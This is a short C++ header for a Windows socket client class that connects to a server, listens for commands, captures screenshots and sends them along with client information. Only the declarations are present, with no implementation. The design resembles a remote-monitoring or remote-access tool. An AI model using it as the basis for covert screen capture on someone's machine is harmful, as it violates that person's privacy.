#pragma once

#include <string>
#include <vector>
#include <winsock2.h>

class Client {
    const char* m_serverIP;
    u_short m_port;
    SOCKET m_socket;
    
public:
    Client(const char* serverIP_, u_short port);
    ~Client();

    void start();
    void stop() const;

private:
    void listenForCommands() const;
    static std::vector<BYTE> captureScreenshot();
    static void sendScreenshot(SOCKET sock);
    static void sendString(SOCKET sock, const std::string& str);
    void sendClientInfo() const;  
};
